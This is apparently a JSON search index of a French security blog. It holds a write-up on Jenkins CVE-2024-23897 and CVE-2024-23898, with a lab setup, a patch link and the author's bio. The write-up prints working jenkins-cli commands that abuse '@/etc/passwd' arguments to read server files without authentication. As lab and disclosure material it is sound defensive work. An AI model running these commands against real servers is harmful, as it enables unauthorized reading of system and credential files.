[{"categories":null,"content":"Introduction Les chercheurs en sécurité de SonarSource ont découvert deux failles de sécurité dans Jenkins : CVE-2024-23897 et CVE-2024-23898. Jenkins a été informé de la découverte de ces vulnérabilités le 13 novembre 2023. Deux vulnérabilités sont expliquées : 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳 : C’est une vulnérabilité qui permet à un attaquant non authentifié, et disposant de la permission “overall/read”, de lire les données des fichiers présents sur le serveur. Sans cette permission, il est possible de lire les premières lignes des fichiers. Versions vulnérables : Les versions antérieures à 2.442 et 2.426.3 LTS 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟴 : 󠁝󠀠C’est une vulnérabilité qui permet à un attaquant d’exécuter des commandes à distance en incitant un utilisateur à cliquer sur un lien malveillant. Elle est de type “cross-site WebSocket hijacking (CSWSH)”. Versions vulnérables : La version 2.217 à la version 2.441 (incluses toutes deux), LTS de la version 2.222.1 à la version 2.426.2 (toutes deux incluses). ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:1:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳 J’ai hosté Jenkins avec le projet Vulnhub disponible sur https://github.com/vulhub/vulhub. ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:2:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Détection de la vulnérabilité ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:2:1","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de la vulnérabilité Un utilisateur disposant des identifiants de connexion peut lire un fichier au complet (exemple : /etc/passwd). java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ -auth admin:admin connect-node \"@/etc/passwd\" Un attaquant non authentifié ou sans les autorisations de lecture globales nécessaires, peut seulement lire 3 lignes : Lire la première ligne java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ who-am-i \"@/etc/passwd\" Lire la deuxième ligne java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ enable-job \"@/etc/passwd\" Lire la troisième ligne java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ help \"@/etc/passwd\" ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:2:2","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟴 On installe Jenkins 2.440 qui est une version vulnérable avec Docker. Les commandes suivantes permettent d’installer et de lancer Jenkins en local. sudo docker pull jenkins/jenkins:2.440-jdk17 sudo docker run -p 8080:8080 jenkins/jenkins:2.440-jdk17 ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:3:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de la vulnérabilité ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:3:1","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Correctifs Mettre à jour la dernière version de Jenkins. Un correctif est déjà disponible. https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314 ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:4:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Presentation Salut, je suis Saliou Thiam, un passionné de la sécurité informatique et je suis spécialisé dans le Pentest. Mon expertise réside dans la découverte proactive de vulnérabilités pour renforcer la sécurité des systèmes informatiques. ","date":"17/01/2024","objectID":"/apropos/apropos/:1:0","tags":null,"title":"A propos","uri":"/apropos/apropos/"},{"categories":null,"content":"Certifications 🛡️ Certified Ethical Hacker 🔐 ComptiaSec+ 🌐 Google CyberSecurity Certificat Professional 🌐 Threat Intelligence and Risk Monitoring 🔐 API Penetration Testing ","date":"17/01/2024","objectID":"/apropos/apropos/:2:0","tags":null,"title":"A propos","uri":"/apropos/apropos/"},{"categories":null,"content":"Contact 📧 Email : info@zalepentester.com ","date":"17/01/2024","objectID":"/apropos/apropos/:3:0","tags":null,"title":"A propos","uri":"/apropos/apropos/"}]